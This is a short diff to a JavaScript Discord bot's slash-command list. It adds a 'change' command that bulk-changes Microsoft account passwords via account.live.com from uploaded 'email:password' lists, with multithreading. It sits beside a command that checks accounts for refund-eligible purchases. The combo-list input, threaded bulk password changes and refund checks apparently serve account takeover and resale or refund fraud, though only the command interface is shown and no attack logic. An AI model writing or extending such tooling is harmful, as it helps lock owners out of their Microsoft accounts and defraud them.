@@ -98,6 +98,14 @@ const commands = [
     .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-10, default 3)").setMinValue(1).setMaxValue(10)),
 
   new SlashCommandBuilder()
+    .setName("change")
+    .setDescription("Bulk change Microsoft account passwords via account.live.com")
+    .addStringOption((o) => o.setName("newpass").setDescription("New password (min 8 chars)").setRequired(true))
+    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
+    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
+    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-3, default 3)").setMinValue(1).setMaxValue(3)),
+
+  new SlashCommandBuilder()
     .setName("refund")
     .setDescription("Check accounts for refund-eligible purchases (14-day)")
     .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
